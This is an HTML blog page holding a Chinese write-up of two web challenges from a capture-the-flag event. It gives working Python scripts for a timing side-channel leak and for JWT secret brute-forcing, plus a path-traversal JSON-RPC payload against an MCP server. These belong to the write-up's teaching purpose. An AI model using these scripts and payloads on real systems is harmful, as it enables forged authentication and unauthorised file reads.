@@ -1,0 +1,316 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hkcertctf-wp | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="webnewrule [solved]扫目录，发现三个endpoint   这里发包测试一下，发现&#x2F;login可以登录，使用&#x2F;提供的账号密码登录会返回一个jwt token jwt token解析一下   可以发现role为guest，提供了&#x2F;admin端点说明要伪造jwt secret来把role变成admin，接着访问&#x2F;www，提示需要添加via头">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hkcertctf-wp">
+<meta property="og:url" content="http://example.com/2025/12/26/hkcertctf-wp/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="webnewrule [solved]扫目录，发现三个endpoint   这里发包测试一下，发现&#x2F;login可以登录，使用&#x2F;提供的账号密码登录会返回一个jwt token jwt token解析一下   可以发现role为guest，提供了&#x2F;admin端点说明要伪造jwt secret来把role变成admin，接着访问&#x2F;www，提示需要添加via头">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-12-26T14:25:30.000Z">
+<meta property="article:modified_time" content="2025-12-26T14:42:52.962Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hkcertctf-wp",
+  "url": "http://example.com/2025/12/26/hkcertctf-wp/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-12-26T14:25:30.000Z",
+  "dateModified": "2025-12-26T14:42:52.962Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/26/hkcertctf-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hkcertctf-wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hkcertctf-wp</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hkcertctf-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-26T14:25:30.000Z" title="发表于 2025-12-26 22:25:30">2025-12-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-26T14:42:52.962Z" title="更新于 2025-12-26 22:42:52">2025-12-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="newrule-solved"><a href="#newrule-solved" class="headerlink" title="newrule [solved]"></a>newrule [solved]</h3><p>扫目录，发现三个endpoint</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps10.jpg" alt="img"> </p>
+<p>这里发包测试一下，发现&#x2F;login可以登录，使用&#x2F;提供的账号密码登录会返回一个jwt token</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps11.jpg" alt="img">jwt token解析一下</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps12.jpg" alt="img"> </p>
+<p>可以发现role为guest，提供了&#x2F;admin端点说明要伪造jwt secret来把role变成admin，接着访问&#x2F;www，提示需要添加via头</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps13.jpg" alt="img"> </p>
+<p>不过这里怎么添加都是u need add header Via��</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps14.jpg" alt="img"></p>
+<p>写个脚本爆破一下这个via，看能出现什么东西，跑了几次发现返回的时长一会长一会短的，甚至有一部分是返回最短的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests, time</span><br><span class="line">burp0_url = &quot;http://web-4bfcfdf89d.challenge.xctf.org.cn:80/www&quot;</span><br><span class="line">alpha = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;&quot;</span><br><span class="line">for i in alpha:</span><br><span class="line">  burp0_headers = &#123;</span><br><span class="line"></span><br><span class="line">      &quot;Via&quot;: i</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  start = time.time()</span><br><span class="line">  r = requests.get(burp0_url, headers=burp0_headers)</span><br><span class="line">  end = time.time()</span><br><span class="line">  res = r.text</span><br><span class="line">  print(f&quot;Trying &#123;i&#125; - &#123;res&#125; - &#123;end - start&#125; seconds&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/wps15.jpg" alt="img"> </p>
+<p>得和出题人对脑洞，问 ai，ai 说这是侧信道攻击��，于是让 ai 搓了一个脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests, time, statistics, sys</span><br><span class="line">\# ================= 配置 =================</span><br><span class="line">flag = &quot;&quot; # 如果已知第一位是 #，这里可以填 flag = &quot;#&quot; 跳过第一位测试后续</span><br><span class="line">burp_url = &quot;http://web-4bfcfdf89d.challenge.xctf.org.cn:80/www&quot;</span><br><span class="line">alpha_beta = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;&quot;</span><br><span class="line">bug_times = 10  # 增加采样数，使用中位数必须有足够样本</span><br><span class="line">send_times = []</span><br><span class="line">length = 64</span><br><span class="line">def attack(payload, bug_times):</span><br><span class="line">  burp_header = &#123;</span><br><span class="line">​    &quot;Via&quot;: payload,</span><br><span class="line">​    &quot;Authorization&quot;: &quot;Bearer &quot;</span><br><span class="line">  &#125;</span><br><span class="line">  for _ in range(bug_times):</span><br><span class="line">​    try:</span><br><span class="line">​      start = time.perf_counter()</span><br><span class="line">​      requests.get(burp_url, headers=burp_header, timeout=5)</span><br><span class="line">​      end = time.perf_counter()</span><br><span class="line">​      send_times.append(end - start)</span><br><span class="line">​    except:</span><br><span class="line">​      pass</span><br><span class="line">  if not send_times: return 0</span><br><span class="line">  return statistics.median(send_times) # 关键修改：使用中位数</span><br><span class="line">print(&quot;[*] 启动基于中位数的统计攻击...&quot;)</span><br><span class="line">for i in range(len(flag), length):</span><br><span class="line">  print(f&quot;\n[+] 正在分析第 &#123;i+1&#125; 位...&quot;)</span><br><span class="line">  char_times = &#123;&#125;</span><br><span class="line">  \# 1. 采集所有字符的时间</span><br><span class="line">  \# 这里不使用 verify 逻辑，而是先把所有字符跑一遍，看谁“格格不入”</span><br><span class="line">  for char in alpha_beta:</span><br><span class="line">​    t = attack(flag + char, bug_times)</span><br><span class="line">​    char_times[char] = t</span><br><span class="line">​    sys.stdout.write(f&quot;\rScan: &#123;char&#125; | Med: &#123;t:.4f&#125;s&quot;)</span><br><span class="line">​    sys.stdout.flush()</span><br><span class="line">  \# 2. 统计分析</span><br><span class="line">  \# 获取所有时间的列表</span><br><span class="line">  all_values = list(char_times.values())</span><br><span class="line">  if not all_values: continue</span><br><span class="line">  \# 计算整个群体的平均值和标准差</span><br><span class="line">  mean_val = statistics.mean(all_values)</span><br><span class="line">  stdev_val = statistics.stdev(all_values) if len(all_values) &gt; 1 else 0</span><br><span class="line">  \# 找出最慢的那个</span><br><span class="line">  best_char = max(char_times, key=char_times.get)</span><br><span class="line">  best_time = char_times[best_char]</span><br><span class="line">  \# 计算 Z-Score (偏离了多少个标准差)</span><br><span class="line">  \# 如果标准差非常小（网络极其稳定），我们需要防除0错误</span><br><span class="line">  z_score = (best_time - mean_val) / stdev_val if stdev_val &gt; 0.0001 else 0</span><br><span class="line">  print(f&quot;\n   [分析] 最慢字符: &#x27;&#123;best_char&#125;&#x27; (&#123;best_time:.4f&#125;s)&quot;)</span><br><span class="line">  print(f&quot;   [统计] 群体均值: &#123;mean_val:.4f&#125;s | 标准差: &#123;stdev_val:.4f&#125; | Z-Score: &#123;z_score:.2f&#125;&quot;)</span><br><span class="line">  \# 3. 动态判决</span><br><span class="line">  \# 如果 Z-Score 大于 2.0 (表示该数值在正态分布中属于前2.5%的异常值)，通常就是它</span><br><span class="line">  \# 或者 它的时间比平均值高出 0.01s (硬保底)</span><br><span class="line">  if z_score &gt; 2.5 or (best_time - mean_val) &gt; 0.01:</span><br><span class="line">​    flag += best_char</span><br><span class="line">​    print(f&quot;[SUCCESS] 锁定: &#123;best_char&#125;&quot;)</span><br><span class="line">​    print(f&quot;[PROGRESS] Flag: &#123;flag&#125;&quot;)</span><br><span class="line">  else:</span><br><span class="line">​    print(f&quot;[FAIL] 区分度不足 (Z-Score &#123;z_score:.2f&#125; 太低). 建议重试或增加 bug_times.&quot;)</span><br><span class="line">​    \# 自动重试逻辑：可以将 bug_times 临时翻倍再测一次 best_char 和 mean_val</span><br><span class="line">​     break</span><br></pre></td></tr></table></figure>
+
+<p>脚本需要多跑几次，然后调一下间隔，就是重复发包，猜这个字符via，然后找出有明显时间变化的</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps16.jpg" alt="img"> </p>
+<p>这里猜了半天由于网络原因会一直跳动，猜了好几次都是 <code>#WTRaoaMB8Zf</code> 但怎么伪造都不对</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps17.jpg" alt="img"> </p>
+<p>还是 #WTRaoaMB8Zf，你妈，这里直接爆破后几位数字了，因为不算长</p>
+<p>爆出来了FNH0</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps18.jpg" alt="img"> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hmac</span><br><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line">import string</span><br><span class="line">token = (</span><br><span class="line">  &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.&quot;</span><br><span class="line">  &quot;eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6Imd1ZXN0In0.&quot;</span><br><span class="line">  &quot;zrqQjd3LlDniCwYLwL_Umt48p0FekVObH6T5jOSo7Zg&quot;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">PREFIX = &quot;#WTRaoaMB8Zf&quot;</span><br><span class="line">alpha_beta = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;&quot;</span><br><span class="line">MAX_LEN = 32</span><br><span class="line">header_payload = &quot;.&quot;.join(token.split(&quot;.&quot;)[:2])</span><br><span class="line">real_sig = token.split(&quot;.&quot;)[2]</span><br><span class="line">def b64url(data: bytes) -&gt; str:</span><br><span class="line">  return base64.urlsafe_b64encode(data).rstrip(b&quot;=&quot;).decode()</span><br><span class="line">print(&quot;[*] Start brute forcing...&quot;)</span><br><span class="line">for length in range(1, MAX_LEN + 1):</span><br><span class="line">  print(f&quot;[*] Trying suffix length = &#123;length&#125;&quot;)</span><br><span class="line">  for suffix in itertools.product(alpha_beta, repeat=length):</span><br><span class="line">​    suffix = &quot;&quot;.join(suffix)</span><br><span class="line">​    secret = PREFIX + suffix</span><br><span class="line">​    sig = hmac.new(</span><br><span class="line">​      secret.encode(),</span><br><span class="line">​      header_payload.encode(),</span><br><span class="line">​      hashlib.sha256</span><br><span class="line">​    ).digest()</span><br><span class="line"></span><br><span class="line">​    if b64url(sig) == real_sig:</span><br><span class="line">​      print(&quot;\n[+] SECRET FOUND !!!&quot;)</span><br><span class="line">​      print(&quot;secret =&quot;, secret)</span><br><span class="line">​      print(&quot;suffix =&quot;, suffix)</span><br><span class="line">​      exit(0)</span><br><span class="line"></span><br><span class="line">print(&quot;[-] Not found&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>接着伪造jwt即可</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps19.jpg" alt="img"> </p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps20.jpg" alt="img"> </p>
+<p>flag{ZsGQxeWESmaP15HTW8AbOX2ke2eG2noJ}</p>
+<h3 id="nettool-solved"><a href="#nettool-solved" class="headerlink" title="nettool [solved]"></a>nettool [solved]</h3><p>本质上就是 JWT 爆破+SSRF 打 fastmcp，非常套娃</p>
+<p>首先jwt伪造让服务器报处SECRET_KEY，其原理就是当长度大于 2048 时会报错，这里先用环境变量自带的 secretkey 构造一个超级长的jwt，然后让服务器解析 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTc2NjIwNDk0MSwiZGF0YSI6IkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSJ9.Q9SOOIxB-03WIRYI_JnGTl_aIXDuXDR8z3YUpeELlf0 然后让服务器报错得到堆栈里的SECRET_KEY</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps21.jpg" alt="img"> </p>
+<p>接下来就是伪造admin的jwt，这个很好伪造，伪造完毕后访问 &#x2F;admin&#x2F;nettools 发现有一个 fastmcp 服务，那就看看有啥工具可以用</p>
+<p>http头</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> &quot;Accept&quot;: &quot;application/json, text/event-stream&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;User-Agent&quot;: &quot;NetTool-Client&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;mcp-session-id&quot;: &quot;c521fc8e0d404acbb672d9782dd908f7&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取工具</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps22.jpg" alt="img"> </p>
+<p>获取提示词</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps23.jpg" alt="img"> </p>
+<p>这里注意到 flag 在特定的地方，所以还需要看对话的上下文，看完上下文后得知flag在&#x2F;..%2f..%2froot%2f1ffflllaaaggg，这之后就是模版注入路径穿越获取到 flag 了，用下面这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;method&quot;: &quot;resources/templates/list&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;id&quot;: 901</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以读取模板，考虑到模板注入，通过路径穿越来</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps24.jpg" alt="img"> </p>
+<p>最后的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> &quot;jsonrpc&quot;: &quot;2.0&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;method&quot;: &quot;resources/read&quot;,</span><br><span class="line"></span><br><span class="line"> &quot;params&quot;: &#123;</span><br><span class="line"></span><br><span class="line">  &quot;uri&quot;: &quot;base64://tmp/..%2f..%2froot%2f1ffflllaaaggg&quot;</span><br><span class="line"></span><br><span class="line"> &#125;,</span><br><span class="line"></span><br><span class="line"> &quot;id&quot;: 20</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接就能读到 flag</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/wps25.jpg" alt="img"> </p>
+<p>base64解码一下即可</p>
+<p>ZmxhZ3tFWWtRNm9KOUJkZWV3S1pmOXh4YWZDQmFtU09uS3N5aX0K</p>
